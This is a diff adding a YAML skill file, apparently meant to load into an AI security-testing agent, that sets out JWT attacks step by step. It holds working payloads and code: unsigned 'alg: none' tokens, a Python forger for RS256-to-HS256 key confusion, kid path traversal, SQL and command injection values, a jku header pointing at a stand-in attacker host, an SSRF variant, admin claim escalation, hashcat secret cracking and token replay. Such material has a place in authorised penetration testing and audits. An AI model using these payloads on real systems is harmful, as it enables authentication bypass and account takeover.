@@ -1,0 +1,137 @@
+id: jwt-attacks
+name: "JWT Attack Techniques"
+description: "JWT algorithm confusion (none/HS256/RS256), kid injection, JWK/JWKS spoofing, claim manipulation, and token forging for auth bypass."
+version: 1
+applicable_roles:
+  - attack
+  - audit
+  - review
+tags:
+  - jwt
+  - authentication
+  - token
+  - algorithm-confusion
+  - kid-injection
+  - jwks
+  - auth-bypass
+  - cryptography
+triggers:
+  - "\\bjwt\\b"
+  - "\\bJWT\\b"
+  - "eyJ[A-Za-z0-9_-]+"
+  - "Bearer\\s+eyJ"
+  - "alg.*HS256"
+  - "alg.*RS256"
+  - "alg.*none"
+  - "jsonwebtoken"
+  - "jose"
+  - "\\.well-known/jwks"
+  - "Authorization.*Bearer"
+  - "token.*expired"
+  - "invalid.*signature"
+estimated_tokens: 850
+content: |
+  ## JWT Attack Techniques
+
+  ### Phase 1: JWT Reconnaissance
+  Decode the token (base64url, no verification needed):
+  ```bash
+  echo 'eyJ...' | cut -d. -f1 | base64 -d 2>/dev/null
+  echo 'eyJ...' | cut -d. -f2 | base64 -d 2>/dev/null
+  ```
+  Key fields to note:
+  - `alg`: signing algorithm (HS256, RS256, ES256, none)
+  - `kid`: key ID — often injectable
+  - `jku`: JWK Set URL — SSRF vector
+  - `x5u`: X.509 URL — SSRF vector
+  - `typ`: token type
+  - Claims: `sub`, `role`, `admin`, `iss`, `exp`, `iat`
+
+  ### Phase 2: Algorithm "none" Attack
+  Set the algorithm to `none` and remove the signature:
+  ```
+  Header: {"alg": "none", "typ": "JWT"}
+  Payload: {"sub": "admin", "role": "admin", "iat": 1700000000}
+  Token: base64url(header).base64url(payload).
+  ```
+  Variations to bypass filters:
+  - `"alg": "None"`, `"alg": "NONE"`, `"alg": "nOnE"`
+  - Empty signature: `header.payload.`
+  - Single dot signature: `header.payload.e30`
+  - Strip `alg` entirely from header
+
+  Try submitting the forged token — libraries with `algorithms: ["none"]` allowed will accept it.
+
+  ### Phase 3: Algorithm Confusion (RS256 → HS256)
+  If the server uses RS256 (asymmetric), but the library accepts HS256 (symmetric):
+  1. Obtain the public key:
+     - `/.well-known/jwks.json`
+     - `/api/keys`, `/oauth/jwks`
+     - TLS certificate of the server
+     - Exposed `public.pem` or `pubkey.pem`
+  2. Use the public key as the HMAC secret to sign a new HS256 token:
+  ```python
+  import jwt
+  import json
+
+  # Read the public key
+  with open('public.pem', 'r') as f:
+      public_key = f.read()
+
+  # Forge token signed with HS256 using the public key as secret
+  payload = {"sub": "admin", "role": "admin", "iat": 1700000000}
+  token = jwt.encode(payload, public_key, algorithm='HS256')
+  print(token)
+  ```
+  The server verifies: `HMAC(token, public_key)` which matches because you signed with that key.
+
+  ### Phase 4: `kid` (Key ID) Injection
+  The `kid` header parameter tells the server which key to use. If it is used in a file path or database query:
+
+  **Path traversal:**
+  ```json
+  {"alg": "HS256", "kid": "../../../dev/null", "typ": "JWT"}
+  ```
+  Sign with an empty string as secret — `/dev/null` returns empty bytes.
+
+  **SQL injection:**
+  ```json
+  {"alg": "HS256", "kid": "1' UNION SELECT 'secret-key' -- -", "typ": "JWT"}
+  ```
+  Sign with `secret-key` as the HMAC secret.
+
+  **Command injection:**
+  ```json
+  {"alg": "HS256", "kid": "key1|/usr/bin/id", "typ": "JWT"}
+  ```
+
+  ### Phase 5: `jku` / `x5u` Header Injection
+  If the server fetches keys from the URL specified in `jku`:
+  1. Generate your own RSA keypair
+  2. Create a JWKS endpoint on your server with your public key
+  3. Forge a token with `"jku": "http://ATTACKER/jwks.json"` and sign with your private key
+  4. The server fetches YOUR JWKS, gets YOUR public key, and verifies successfully
+
+  SSRF variant: `"jku": "http://127.0.0.1:8080/internal-api"` — the server will make the request.
+
+  ### Phase 6: Claim Manipulation
+  After finding a signing bypass, forge tokens with escalated claims:
+  - `"role": "admin"` or `"admin": true`
+  - `"sub": "administrator"` or `"sub": "1"` (first user, usually admin)
+  - `"email": "admin@target.com"`
+  - Remove `exp` claim or set far-future expiry
+  - Add `"scope": "openid profile admin"` for OAuth flows
+
+  ### Phase 7: Weak Secret Brute-Force
+  For HS256 tokens, try common secrets:
+  ```bash
+  # Using jwt_tool or hashcat
+  hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+  ```
+  Common weak secrets: `secret`, `password`, `123456`, `changeme`, `your-256-bit-secret` (default from jwt.io), empty string, `key`, `private`, the app name.
+
+  ### Phase 8: Token Refresh / Replay
+  - Capture a valid token and replay after expiry — some servers skip `exp` validation
+  - Use a refresh token endpoint to get new access tokens indefinitely
+  - Check if tokens are invalidated on logout (many apps do not server-side invalidate JWTs)
+  - Test cross-tenant token reuse: token from tenant A accepted by tenant B
